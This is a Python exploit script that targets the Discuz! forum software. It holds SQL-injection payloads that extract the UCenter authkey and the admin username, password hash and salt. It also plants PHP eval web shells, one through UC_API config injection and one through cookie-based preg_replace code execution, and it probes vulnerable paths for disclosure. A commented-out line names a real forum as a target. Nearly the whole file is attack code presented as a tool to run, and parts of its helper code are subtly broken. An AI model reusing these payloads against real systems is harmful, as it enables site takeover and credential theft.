# utf-8
import time
import base64
import math
import hashlib
import requests
import sys
import re
import json
import argparse
GET_SHELL_PALOAD = ('''<?xml version="1.0" encoding="ISO-8859-1"?><ro'''
    '''ot><item id="UC_API">https://sb\');eval(\$_REQUEST[f]);#</item></root>'''
)
GET_KEY_PAYLOAD = ('/faq.php?action=grouppermission&gids[99]=%27'
    '&gids[100][0]=)%20union%20select%201%20from%20(select%20coun'
    't(*),concat(0x236623,(select%20md5(authkey)%20from%20cdb_uc_ap'
    'plications%20limit%201),0x236623,floor(rand(0)*2))a%20from%20i'
    'nformation_schema.tables%20group%20by%20a)b--%20a'
)

GET_ADMIN_PAYLOAD = ('/faq.php?action=grouppermission&gids[99]=%27&'
    'gids[100][0]=) and (select 1 from (select count(*),concat((sele'
    'ct (select (select concat(0x236623,username,0x236623,password,0'
    'x236623,salt,0x236623) from cdb_uc_members limit 1) ) from `inf'
    'ormation_schema`.tables limit 0,1),floor(rand(0)*2))x from info'
    'rmation_schema.tables group by x)a)%23'
)
def url_format(url):
    if not url.startswith(('http://', 'https://')):
         url= 'http://'+url
    if url.endswith('/'):
        url = url[:-1]
    return url
def Url_req(url,data=None):
    headers ={
        'User-Agent' : ('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) '
            'AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.151 Safari/534.16'
        ),
    }
    try:
        req=requests.get(url,params=None)
    except Exception as e:
        print e
    else:
        return req.text
def get_authcode(string,key):
    ckey_length =4
    key= hashlib.md5(key).hexdigest()
    keya= hashlib.md5(key[0:16]).hexdigest()
    keyb=hashlib.md5(key[16:32]).hexdigest()
    microtime = '%.8f %d' % math.modf(time.time())
    keyc=(hashlib.md5(microtime).hexdigest())[-ckey_length:]
    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()
    key_length = len(cryptkey)
    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
    string_length = len(string)

    count = 0
    box = range(256)
    for n in range(256):
        randkey = ord(cryptkey[n % key_length])
        count = (count + box[n] + randkey) % 256
        tmp = box[n]
        box[n] = box[count]
        box[count] = tmp

    i = j = 0
    result = ''
    for n in range(string_length):
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        tmp = box[i]
        box[i] = box[j]
        box[j] = box[i]
        result += chr(ord(string[n]) ^ (box[(box[i] + box[j]) % 256]))
    result = base64.b64encode(result).replace('=', '')
    return keyc + result
def get_shell(url,key):
    host= url_format(url)
    query_string= 'time=%s&action=updateapps' % time.time()
    code = get_authcode((query_string,key))
    url +='?code={0}'.format(code)
    text=Url_req(url,GET_SHELL_PALOAD)
    if text !=None:
        print'get shell success!{0}'.format(host)

def get_key(url):
    url = url_format(url)
    url += GET_KEY_PAYLOAD
    text = Url_req(url)
    if '#f#' in text:
        key= text.split('#f#')[1]
        print 'key is {0}'.format(key)
        return key
    else:
        print 'get key error'
def getadmin(url):
    url=url_format(url)
    url +=GET_ADMIN_PAYLOAD
    text= Url_req(url)
    if '#f#' in text:
        key=text.split('#f#')
        username=key[1]
        pwd=key[2]
        salt=key[3]
        print'username:{0},pwd:{1},salt:{2}'.format(username,pwd,salt)
    else:
        print 'get admin error'
class RemoteExecute():
    def __init__(self,url):
        self.url = url
    def get_verify_url(self):
        veryify_url_list=[]
        match_result=re.compile("(redirect\.php\?tid=\d+&amp;goto=lastpost|viewthread\.php\?tid=\d+)")
        rsp=requests.get(self.url)
        if rsp:
            veryify_url_list=match_result.findall(rsp.text)
            return veryify_url_list
    def verity(self):
        details={}
        payload=("GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE]"
                        "[smilies][replacearray]=var_dump(md5(564883737458362684));")
        headers = {'Cookie':payload}
        urllist = self.get_verify_url(self.url)
        for verify_url in urllist:
            verify_url=verify_url.replace('&amp;','&')
            test_url=self.url+"/"+verify_url
            req= requests.get(test_url,headers)
            if req and '0bc3007107b28d15c86a14b2b0302daa' in req.text:
                details['vul_url']=test_url
                details['Cookie']=payload
                break
        return details
    def exoploit(self):
        detail  = {}
        payload = ("GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies]"
                   "[replacearray]=eval(base64_decode($_POST[c]));")
        headers = {'Cookie':payload}
        urllist = self.get_verify_url()
        for verify_url in urllist:
            verify_url = verify_url.replace('&amp;','&')
            test_url = self.url + "/" + verify_url
            postdata = 'c=ZWNobyBtZDUoJyFAMmVBR2RAI0EnKTs='
            rsp = requests.post(test_url, headers=headers, data=postdata)
            if rsp and 'a47d1b3ad5c88fe78963e4d9354edf04' in rsp.text:
                detail['vul_url'] = test_url
                detail['Cookie']  = payload
                detail['Content'] = '<?php eval(base64_decode($_POST[c])); ?>'
                break
            else:
                print 'excute error'
        return detail
class DiscuzPathBru():
    def __init__(self,url):
        if not url.startswith('http'):
            url='http://'+url
        self.url=url.strip('/')
    def extract_path(self,path,content):
        path=''
        pattern='/.+?'+path
        res=re.findall(pattern,content)
        if res:
            path=res[0].replace(path,'')
        return path
    def is_success(self,path,content):
        result = False
        if 'Fatal error'in content and path in content:
            result= True
        elif 'Warning:' in content and 'array_key_exists():' in content:
            result = True
        return result
    def verify(self):
        path=''
        headers ={
        'User-Agent' : ('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) '
            'AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.151 Safari/534.16'
        ),
    }
        path_list=[
            '/api.php',
            '/uc_server/control/admin/db.php',
            '/install/include/install_lang.php',
            # Discuz x2
            '/source/function/function_connect.php'
        ]
        try:
            for vul_path in path_list:
                url = self.url+vul_path+'?mod[]=hello'
                req=requests.get(url,headers=headers)
                content=req.text
                if self.is_success(vul_path,content):
                    path=self.extract_path(vul_path,content)
                    break
                else:
                    print'error brute'
            return path
        except:
            pass
if __name__== '__main__':
    results=[]
    parse=argparse.ArgumentParser("dz exploit")
    parse.add_argument('-u','--url',dest='url_set',help='host url',action='store')
    parse.add_argument('-b','--brute',help="brute path y or n",dest='brute_path',action='store')
    parse.add_argument('-r','--remote',help='RemoteExcute',action='store',dest='remote_use')
    parse.add_argument('-s','--shell',help='get shell',action='store',dest='get_shell')
    parse.add_argument('-a','--admin',help='get admin',action='store',dest='get_admin')
    parse.add_argument('-d','--defualt',help='defualt run all of above',action='store',dest='run')
    #args=['-u','bbs.saraba1st.com','-d','y']
    args=parse.parse_args()
    if args.url_set and args.brute_path =='y':
        go=DiscuzPathBru(args.url_set)
        results.append(go.verify())
    elif args.url_set and args.remote_use =='y':
        rem=RemoteExecute(args.url_set)
        results.append(rem.exoploit())
    elif args.url_set and args.get_shell =='y':
        get_shell(args.url_set,get_key(args.url_set))
    elif args.url_set and args.get_admin =='y':
        getadmin(args.url_set)
    elif args.url_set and args.run =='y':
        try:
            go=DiscuzPathBru(args.url_set)
            results.append(go.verify())
        except:
            pass
        try:
            rem=RemoteExecute(args.url_set)
            results.append(rem.exoploit())
        except:
            pass
        try:
            get_shell(args.url_set,get_key(args.url_set))
        except:
            pass
        try:
            getadmin(args.url_set)
        except:
            pass
        #json.dump(results)
    else:
        print '''
        Usage: name of you.py -h  \n
        if you want to find path you need to using -u and -b together\n
        the other's  like the first useage
              '''
        sys.exit()

